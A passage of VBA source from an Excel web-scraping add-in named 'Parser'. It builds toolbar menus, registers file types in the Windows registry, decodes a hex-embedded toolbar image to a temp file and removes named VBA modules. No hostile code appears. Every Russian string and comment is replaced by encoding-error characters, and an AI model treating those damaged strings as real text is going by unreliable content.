    If WB Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub

    Set VBProj = WB.VBProject
    If VBProj Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| VBA", vbExclamation: Exit Sub

    If LCase(WB.Name) Like "*.xla" Then Exit Sub        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    For Each VBComp In VBProj.VBComponents
        If VBComp.Type = 1 Then        ' vbext_ct_StdModule=1
            If VBComp.Name Like ModuleNameMask$ Then VBProj.VBComponents.Remove VBComp
        End If
    Next VBComp
End Sub
Attribute VB_Name = "mod_Main"
'---------------------------------------------------------------------------------------
' Module        : mod_Main                    Version:
' Author        : Igor Vakhnenko                   Date: 16.10.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Private Module        ': Option Explicit
Public Const PROJECT_NAME$ = "Parser", PROJECT_YEAR& = 2013

Private Sub CreateCommandBar(): CreateProgramCommandBar 0: End Sub
    
Sub CreateProgramCommandBar(Optional ByVal RefreshOnly As Boolean = True)
    On Error Resume Next
    SaveDefaultSettings
    
    Dim AddinMenu As CommandBar, coll As Collection, i&, MainMacroButton As Object, NeedToSelectParser As Boolean
    Application.ScreenUpdating = False
    If Not RefreshOnly Then Run DeleteOldCommandBar
    Set AddinMenu = GetCommandBar(PROJECT_NAME, True Or RefreshOnly)
    
    ' menu begin
    
    Set coll = FilenamesCollection(PARSERS_FOLDER$, "*" & PARSER_EXT$, 1)
    curr_WP_name$ = CURRENT_PARSER$
    
    Dim APs As WebsiteParsers, combo As CommandBarComboBox
    Set APs = AllParsers(True)        ' APs.LoadAllFromFolder
    If APs.Items.Count > 0 Then
        Mode& = IIf(APs.Items.Count = 1, msoComboNormal, msoComboLabel)
        ' Mode& = msoComboNormal
        Set combo = Add_Control(AddinMenu, ct_DROPDOWN, 0, "ChangeActiveParser_FromMenu", tt("MENU_Parser") & ": ", Mode&, True, "DFS_FromMenu")
        WP_arr = APs.ToArray
        For i = LBound(WP_arr) To UBound(WP_arr)
            combo.AddItem WP_arr(i)
        Next i
        For i = 1 To combo.ListCount
            If combo.list(i) = curr_WP_name$ Then combo.ListIndex = i: Exit For
        Next i
        NeedToSelectParser = combo.ListIndex = 0
        combo.OnAction = "'" & ThisWorkbook.Name & "'!ChangeActiveParser_FromMenu"
        
        If NeedToSelectParser = True And coll.Count = 1 Then
            curr_WP_name$ = WP_arr(1)
            CURRENT_PARSER$ curr_WP_name$
            combo.ListIndex = 1
            NeedToSelectParser = False
        End If
    End If
    
    If coll.Count Then
        ' 3021, 1075, 6280, 6522
        Add_Control(AddinMenu, ct_BUTTON, 0, "0", " ", msoButtonCaption, False).Enabled = 0
        
        If NeedToSelectParser Then
            Add_Control(AddinMenu, ct_BUTTON, 0, "0", tt("MENU_SelectParserOrCreateNewOne"), msoButtonCaption, True).Enabled = 0
        Else
            Set MainMacroButton = Add_Control(AddinMenu, ct_BUTTON, 6280, "StartParcing", tt("MENU_StartLoading"), msoButtonIconAndCaption, False)
            ' Add_Control AddinMenu, ct_BUTTON, 6280, "StartParcing", tt("MENU_StartLoading"), msoButtonIconAndCaption, False
            Add_Control(AddinMenu, ct_BUTTON, 0, "0", tt("MENU_or"), msoButtonCaption, False).Enabled = 0
            Add_Control AddinMenu, ct_BUTTON, 548, "EditActiveParser", tt("MENU_Configure"), msoButtonIconAndCaption, False
        End If
    Else
        Add_Control AddinMenu, ct_BUTTON, 548, "AddNewParser", tt("MENU_CreateAndConfigureNewParser"), msoButtonIconAndCaption, True
    End If
    
    
    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    Set subMenu2 = Add_Control(AddinMenu, ct_POPUP, 0, "", tt("MENU_ExtraSettings"), , True)
    
    Add_Control subMenu2, ct_BUTTON, 1664, "AddNewParser", tt("MENU_AddNewParser"), msoButtonIconAndCaption, True
    
    If coll.Count > 1 Then
        Set subMenu_PC = Add_Control(subMenu2, ct_POPUP, 548, "", tt("MENU_EditParser"), msoButtonIconAndCaption, False)
        If coll.Count > 25 Then
            stp& = 10
            For i& = 1 To coll.Count Step stp&
                i1& = i: i2& = Application.min(i + stp& - 1, coll.Count)
                capt$ = tt("MENU_ParserDropdownPrefix") & " " & UCase(Left(Dir(coll(i1)), 1)) & " .. " & UCase(Left(Dir(coll(i2)), 1)) & "  (" & i2 - i1 + 1 & ")"
                Set subMenu_PC_ = Add_Control(subMenu_PC, ct_POPUP, 502, "", capt$, msoButtonIconAndCaption)
                For ind& = i1 To i2
                    FileName = Replace(Dir(coll(ind&)), PARSER_EXT$, "")
                    Add_Control subMenu_PC_, ct_BUTTON, 3885, "EditParser", FileName, msoButtonIconAndCaption, , coll(ind&)
                Next ind
            Next i
        Else
            For Each FileName In coll
                Add_Control subMenu_PC, ct_BUTTON, 3885, "EditParser", Replace(Dir(FileName), PARSER_EXT$, ""), msoButtonIconAndCaption, , FileName
            Next
        End If
        
        If Not NeedToSelectParser Then
            Add_Control subMenu2, ct_BUTTON, 3265, "DeleteActiveParser", tt("MENU_DeleteCurrentParser", curr_WP_name$), msoButtonIconAndCaption, True
        End If
    End If
    
    Add_Control subMenu2, ct_BUTTON, 222, "ShowSettingsPage", tt("MENU_CommonSettings"), msoButtonIconAndCaption, True
    Add_Control subMenu2, ct_BUTTON, 1759, "CreateProgramCommandBar", tt("MENU_refreshToolbar"), msoButtonIconAndCaption
    Add_Control subMenu2, ct_BUTTON, 1, "ShowParserDescriptionAtLocalhost", tt("MENU_ShowAlgorithm"), msoButtonIconAndCaption, True
    Add_Control subMenu2, ct_BUTTON, 543, "Edit_ReplaceTables", tt("MENU_ReplaceTables") & " |fffd|", msoButtonIconAndCaption, True
    Add_Control subMenu2, ct_BUTTON, 461, "Edit_ResourceFiles", tt("MENU_ResourceFiles") & " |fffd|", msoButtonIconAndCaption ', True
    Add_Control subMenu2, ct_BUTTON, 0, "DeleteScheduledTasks", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True
    RunWithDelay "LoadAllSettings", 10
    
    If SETT.GetBoolean("DeveloperMode") Then
        Add_Control subMenu2, ct_BUTTON, 0, "ShowActionsForm", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True
        Add_Control subMenu2, ct_BUTTON, 0, "ShowTestActionsForm", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption
        Add_Control subMenu2, ct_BUTTON, 0, "Toggle_ShowWebQuerySheet", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| WebQuery", msoButtonIconAndCaption
        'If Developer Then Add_Control subMenu2, ct_BUTTON, 1, "ShowParserDescriptionAtWebsite", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ExcelVBA.ru", msoButtonIconAndCaption
    End If
    Add_Control subMenu2, ct_BUTTON, 49, "OpenManual", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True
    
    
    AddSettingsSwitcher AddinMenu, ct_DROPDOWN, , "StartParcing", MainMacroButton
    
    ' menu end
    ' Add3Buttons AddinMenu
    Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
    Add_Control AddinMenu, ct_BUTTON, 487, "ShowMainForm", tt("MENU_About") & "  ", msoButtonIconAndCaption, True
    Add_Control AddinMenu, ct_BUTTON, IIf(Val(Application.Version) <= 11, 4356, 923), "ExitProgram", tt("MENU_Exit"), msoButtonIcon, True
    
    
    If Not RefreshOnly Then
        RunWithDelay "ActivateAddinsTab"
        AddUpdateButton AddinMenu
        RunWithDelay "ActivateAddinsTab"
    End If
    
    If SETT.GetBoolean("DeveloperMode") Then
        Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, True).Enabled = 0
        Add_Control AddinMenu, ct_BUTTON, 1755, "SetActiveFolder", tt("MENU_SettingsFolderByActiveFile"), msoButtonIcon, True        ' 1660
        Add_Control AddinMenu, ct_BUTTON, 1668, "ResetActiveFolder", tt("MENU_SettingsFolderDefault"), msoButtonIcon, True
        Add_Control AddinMenu, ct_BUTTON, 3, "SaveToCurrentFolder", tt("MENU_SaveWorkbookToOpenedFolder"), msoButtonIcon, True
        
        Set subMenu2 = Add_Control(AddinMenu, ct_POPUP, 0, "", " ", , True)
        Add_Control subMenu2, ct_BUTTON, 793, "RunParserBySelection", tt("MENU_RunParserByActiveCell"), msoButtonIconAndCaption
        Add_Control subMenu2, ct_BUTTON, 0, "CleanHeader_PriceMonitoring", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True
        Add_Control subMenu2, ct_BUTTON, 0, "RestoreHyperlinksStyle", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption
    End If
    
    
    If Developer Then
        Add_Control(AddinMenu, ct_BUTTON, 0, "0", "  ", msoButtonIconAndCaption, False).Enabled = 0
        Set subMenuD = Add_Control(AddinMenu, ct_POPUP, 0, "", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , True)
        Add_Control subMenuD, ct_BUTTON, 12, "Parser_CreateDescription", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True
        Add_Control subMenuD, ct_BUTTON, 3, "Parser_ResaveResultExample", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption
        
        Add_Control(subMenuD, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, True).Enabled = 0
        'Add_Control subMenuD, ct_BUTTON, , "ShowFirstRunForm", "Show FirstRun Form", msoButtonIconAndCaption, True
        Add_Control subMenuD, ct_BUTTON, , "ToggleIsAddin", "Show/Hide TR Sheet", msoButtonIconAndCaption, True
        Add_Control subMenuD, ct_BUTTON, 11, "ShowBuiltInActionsEditor", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", msoButtonIconAndCaption, True
        
        Add_Control subMenuD, ct_BUTTON, 0, "Pr_PM", "P - PM", msoButtonIconAndCaption, True
        Add_Control subMenuD, ct_BUTTON, 0, "Up_PM", "U - PM", msoButtonIconAndCaption
    End If
    
    Application.ScreenUpdating = True
End Sub

Sub SaveDefaultSettings()
    On Error Resume Next
    With SETT
        .LoadAllSettings
        .AddDefaultValue "TextBox_ParsersFolder", Replace(DEFAULT_PARSERS_FOLDER$, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$)
        .AddDefaultValue "FavouritesActions", "LoadHTML;GetTags;GetPagerLinks;GetHyperlinkAndText;TextBetween;CheckCondition;JoinArrayItems;SelectedArrayItems;ProgressIndicatorNew;SetVariable;GetVariable"
        .AddDefaultValue "TextBox_CacheFolder", DEFAULT_CACHE_FOLDER$
        .AddDefaultValue "TextBox_PluginFolder", Replace(DEFAULT_PLUGIN_FOLDER$, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$)
        
        .AddDefaultValue "CheckBox_ScrollBalloonWindow", False
        .AddDefaultValue "ComboBox_MaxBalloons", 10
    End With
    
    With SETT
        .SetText "", "Parser.Settings", "HKCR\.xlp\"
        .SetText "Content Type", "text/xml", "HKCR\.xlp\"
        .SetText "PerceivedType", "text", "HKCR\.xlp\"
        .SetText "", "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "HKCR\Parser.Settings\"
        .SetText "AlwaysShowExt", "", "HKCR\Parser.Settings\"
        .SetText "", "imageres.dll,109", "HKCR\Parser.Settings\DefaultIcon\"
        
        .SetText "", "Parser.ReplaceTable", "HKCR\.rt\"
        .SetText "Content Type", "text/xml", "HKCR\.rt\"
        .SetText "PerceivedType", "text", "HKCR\.rt\"
        .SetText "", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "HKCR\Parser.ReplaceTable\"
        .SetText "", "shell32.dll,69", "HKCR\Parser.ReplaceTable\DefaultIcon\"
    End With
    SHChangeNotify &H8000000, 0, 0, 0    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Windows
End Sub

Sub OpenManual()
    FWF.FollowHyperlink "http://excelvba.ru/programmes/Parser/manuals"
End Sub

Sub SettingSetChanged()
    RunWithDelay "CreateProgramCommandBar", 0.5
End Sub

Sub StartParcing()
    On Error Resume Next
    StopMacro = False
    RunActiveParser
End Sub

Sub UpdateAddinToolbar()
    RunWithDelay "CreateProgramCommandBar", 0.6
End Sub

Sub ShowActionsForm()
    On Error Resume Next
    FP_SelectAction.Show
End Sub

Sub ShowTestActionsForm()
    On Error Resume Next
    Set ActiveAAs = New ArrayActions
    CreateNewInstanceOfWinHttpRequest
    ActiveAAs.Load "TestActionsForm"
    With FP_ArrayActions_Edit
        .CommandButton_DeleteAllActions.Visible = True
        .Show
    End With
End Sub

Sub SetActiveFolder()
    On Error Resume Next
    Folder$ = ActiveWorkbook.Path
    If Folder$ = "" Then Folder$ = GetOpenedFolder
    
    If Folder$ = "" Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical
        Exit Sub
    End If
    
    CURRENT_XLP_FOLDER$ Folder$ & IIf(Right(Folder$, 1) = "\", "", "\")
    CreateNewInstanceOfWinHttpRequest
    UpdateAddinToolbar
End Sub

Sub EditParserBySelection()
    On Error Resume Next: Dim WP_name$
    WP_name$ = Trim(ActiveCell.EntireColumn.Cells(1)): If WP_name$ = "" Then Exit Sub
    If AllParsers(True).ParserExists(WP_name$) Then
        If WP_name$ <> CURRENT_PARSER$ Then
            CURRENT_PARSER$ WP_name$
            UpdateAddinToolbar
        End If
        AllParsers.GetActiveParser.Edit
    Else
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & WP_name$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!", vbCritical: Exit Sub
    End If
End Sub

Sub RunParserBySelection()
    On Error Resume Next: Dim WP_name$
    WP_name$ = Trim(ActiveCell.EntireColumn.Cells(1)): If WP_name$ = "" Then Exit Sub
    If AllParsers(True).ParserExists(WP_name$) Then
        If WP_name$ <> CURRENT_PARSER$ Then
            CURRENT_PARSER$ WP_name$
            RunWithDelay "CreateProgramCommandBar", 0.3
        End If
        RunWithDelay "RunActiveParser"
    Else
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & WP_name$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!", vbCritical: Exit Sub
    End If
End Sub
Sub ResetActiveFolder()
    CURRENT_XLP_FOLDER$ "-"
    CreateNewInstanceOfWinHttpRequest
    UpdateAddinToolbar
End Sub

Sub ChangeActiveParser_FromMenu()        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    WP_name$ = Application.CommandBars.ActionControl.text
    If WP_name$ = CURRENT_PARSER$ Then Exit Sub
    CURRENT_PARSER$ WP_name$
    Set ParserVariables = Nothing
    CreateNewInstanceOfWinHttpRequest
    UpdateAddinToolbar
End Sub

Function GetFile_MainPicture() As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim F_TXT$, buf$, tmp_file$: Const BufLen& = 5000

    F_TXT$ = F_TXT$ & "8400E2F2E200BD66250042C67200FAB1530016BE290082BA5D007CB7550077E18E009ECEA000059B330034C062005ED27800E0721A00E1AB8000F0FBF7004ED48000F5BF8A00A8C3A700F8EBDD00AC400900CADFD400AF9A88001BCB5200F1E7DA0036B73E00FFDC8000D3D4D300CE945F00779B2F00ECEDEC00C4B5AD00B77F3700079B0C00DA9B5F0006D41E0070DC9100E0B28D007AE4B600D9A37700BB61430093CE960051AE5F0080CEA2006CDC7D00BCA09400ECE6DC00FFCD7700C2663B00CE5A2300056A09008CDCAD008CECC40001C91C00A9938600DE8D460024D86000C97D3B001CA6220071DD8200E2C1BD009FDECB00DBA991000F923000D0823D00E8EBE50040DD7400CC968600C9CFD2006DD48F00BFF3E20004CB3C0014721900B4692F0041E67C00B45A4600D2722400BC9C800027B15600B3EACC0066BA8300BB6B5400FFFFFE0038BC4A005AF0640025C03200EFB1600031A43E002DD76500FBA0460098E6BF00E38B3D0045C08200BF806D00BE651A004AA55C0034DD6E00A33005007CDBA700CAE4C900AEB4B8005EED9300CA7A3400E3FBF40077CC940066A12D00D09A7C00B2DAB40060B67A0004640600CD854F003F9E57003DB04D009CBEAE0054C46300B6BCC00003C31D0053E88900CC8A620086DF940005CD"


    F_TXT$ = F_TXT$ & "BCBCBCBCBCBCBCBCBCBCBC154F79D1D1D1D1D13737373737D1D1D1D1D1D1D1D1D1D1D1D137373737D179BCBCBC6B1885851BBCBC0000BCBCBCBC567733F1BCBCBC1BCE080E5C9984849999999999999999C08680DD1BBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC01F3CC02020202909090905F5F9E656565656565656565659E9E9E9E9EC46567B079BC93238527F4BC0000BCBCBCBCECE509D4F4BCF51C9A60209920484848485C5C484848209999C010F61BBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC67752C2C818181A2C2CACAB45555DFCFCF0F0F0F0F0FCFCF40DFDFDF666602C467013D5B2785F4BC0000BCBCBCBC1B030986271B689B6320485C335D09A1A1C5A1A10933338C5C204886F6E8BCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC017A3B3BE2282828A2CA2525B45555DFCFCF0F0F0FCFCF40DF5555B4B4AC0505CC679D30277FF4BC0000BCBCBCBC199A3A860B1C9B21485C09094764D03232D03232D064470909098C5CE689F4BCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC79CC073BE2E22828A2C22525B4B455DFDFCFCFCF"
    F_TXT$ = F_TXT$ & "CFCF40DF5555B425CACAAC05814067D28527BCBC0000BCBCBCBCBC2EE55C22923A48330947D8A33232E610D410E63232AA644747470909FFAEBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC67053BB1E228282828A2252525B4B4B4555555555555B4B4252525C2A2A2C2052CCCC42388BCBC0000BCBCBCBCBC06248CF0B63333A147D8AA3232D82E464646BB9A4A32D0A3A3AAA347AAB788BCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC372A3B3BB1E2285EC2056D7A66402A720F0F0F0F8E40407A7A6D0575812828A281B8657F19BCBC0000BCBCBCBCBC58FA4A64AA09A1646464A34A6CBB0658F4F439C7FDC8C84A4A4A4A32D08A85BCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC795F073BB1B128766242954F3D157FF5ABABABF57F235BDB4F424242752C2C81812CCC59BCBCBC0000BCBCBCBCBCBC1024F0A36464646464A3C83498BCBCBCBCBCBCB5FD6C6C6C32F0F0D02441BCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC67053BE2B1816202954FDB3DD5CD7F59F5597FD5E372A5967676166D51513B073B2AB0BCBCBC0000BCBCBCBCBCBC39FD4AF0"
    F_TXT$ = F_TXT$ & "A3AA646464AA4BADBCBCBCBCBCBCBC06349292E7E7E7E7E792C7BCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCD1023B3BB1C216C1F7DA9494161262181862125313BE363636453E3E51515151512A37BCBCBC0000BCBCBCBCBCBCBC382432D0A3646464AACB1CAE23AEAEAEAEAEAE54545454545454545423F4BCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC6BBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC65073B3B7AD6508B8B8BA4351D83838335BF131313BE3645C1D6D651515151740279BCBCBC0000BCBCBCBCBCBCBC56FDC832D0A3A364A37E08080808A0A0A0A0A08080808080808080A0801BBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC6A4DCDBCBCBCBCBCBCBCBCBCBCBCBCBCBCBC376D3B2C7695B250EFE9A4A435353535BF45451313BE2BA43EBA6207515174B8A7BCBCBCBC0000BCBCBCBCBCBCF4BC2E244AF0D0A36464A3AAC3C3C36E6E6E6E6E6E6E6E486E6E48C0486339BCBCBCBCBCBCBCBCBC8239393939393939394D0CD371D56BBCBCBCBCBCBCBCBCBCBCBCBC79903B2CAF9D940050EFA4A48B8BEE0A5A5A452B2B2BA4C9BABA42B85151A9C601BCBCBCBC0000BCBCBCBCBCBC851B9834E54AF0A3A3A3D03AC5C55D5D5D5D5D335C48482048204848203339BCBCBCBCBC"
    F_TXT$ = F_TXT$ & "BCBCBCBC868A8AF90DF84949498787D30C52571844BCBCBCBCBCBCBCBCBCBCBC6707079D9D29C9002D3535A48B118D5A5A5E2B2B83A93E4262426D5174A99579BCBCBCBC0000BCBCBCBCBCBCD40B79E4FD4A32D0A3D0A3D0D0D0D0D0D0D03AAA64A13333333333335DAA98BCBCBCBCBCBCBCBCBC868AF90D0D0D49498787D3D3D3521D1D6F2B1FBCBCBCBCBCBCBCBCBC377A75299D9D2914001AC1C1E99F8D8D5E2B2BBFEFC14CC9D2D23E2C5105B0BCBCBCBCBC0000BCBCBCBCBCBC913243F4386C4A32D0F0FAE7E0383838E0E0E0D8D0AA0909090909A11EF058BCBCBCBCBCBCBCBCBC868AF90D0D0D49498787D3D3D3521D1DBF2B1FBCBCBCBCBCBCBCBCBCBC5F761F292929C414001A35DE9F8D5E2B2B832D2D4CFE4CC9D28E075102D1BCBCBCBCBC0000BCBCBCBCBCBC06030E233992324AF04A040B56A6A6A6A6A6564124A34747474764AA030EBCBCBCBCBCBCBCBCBCBC8C8A8AF90DF84949498787D30C5257E3FBBCBCBCBCBCBCBCBCBCBCBCBCB09D1F1F1FC4C41FFE500A9F9F5E53534E50D79C9C509CB2423F070767BCBCBCBCBCBC0000BCBCBCBCBCBC394B77E0AEF1FA324A327E89BCBCBCBCBCBC79974BAA476464AAA3D07E2EBCBCBCBCBCBCBCBCBCBCAB82829898989898984D0CD3701579BCBCBCBCBCBCBCBCBCBCBCBCBC"




    For i = 1 To Len(F_TXT$) / 2
        buf$ = buf$ & Chr(Val("&H" & Mid(F_TXT$, 2 * i - 1, 2)))
        If Len(buf$) > BufLen& Then res$ = res$ & buf$: buf$ = "": DoEvents
    Next
    res$ = res$ & buf$
    tmp_file$ = Environ("tmp") & "\file_MainPicture_" & PROJECT_NAME$: Kill tmp_file$
    ff& = FreeFile: Open tmp_file$ For Binary Access Write As #ff
    Put #ff, , res$
    Close #ff
    If FileLen(tmp_file$) = Len(F_TXT$) / 2 Then GetFile_MainPicture = tmp_file$
End Function


'Sub ApplyZoomTo(ByRef UF)
'    On Error Resume Next
'    zo = SETT.GetNumber("ComboBox_Zoom", 100)
'    If zo < 40 Then zo = 100
'    dh& = UF.Height - UF.InsideHeight
'    UF.Width = UF.Width * zo / 100: UF.Height = (UF.Height - dh&) * zo / 100 + dh&
'    UF.Zoom = zo
'    ' Debug.Print UF.Zoom, UF.InsideHeight, UF.Height, UF.InsideWidth, UF.Width
'End Sub

Sub OnlineHelp(ByVal URL$, Optional ByVal CallerName As String)
    On Error Resume Next
    If URL$ = "" Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ExcelVBA.ru" & vbNewLine & vbNewLine & _
